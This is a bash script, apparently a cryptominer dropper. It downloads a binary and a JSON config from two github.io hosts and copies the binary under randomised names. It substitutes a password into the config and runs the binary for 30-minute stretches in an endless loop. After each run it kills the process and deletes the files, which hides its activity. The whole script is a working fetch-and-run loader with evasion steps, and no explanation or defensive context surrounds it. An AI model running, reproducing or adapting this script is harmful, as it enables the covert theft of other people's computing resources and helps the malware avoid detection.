#!/bin/bash
echo "Getting Things Ready ... "
wget http://dzmltzack.github.io/web/xm -O oxm
while true
do
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
BB=z$NEW_UUID
NN=n$NEW_UUID
cp oxm $BB
echo $NN >> $BB
wget https://pzeankto.github.io/namnam/arqt.json -O config.json
sed -i "s/PSPS/$PASS/g" config.json
chmod +x $BB
./$BB
sleep 1800
kill -9 $(pgrep $BB)
kill -9 $(pgrep z)
rm -f $BB
rm -f z*
rm -f config.json
sleep 200
done
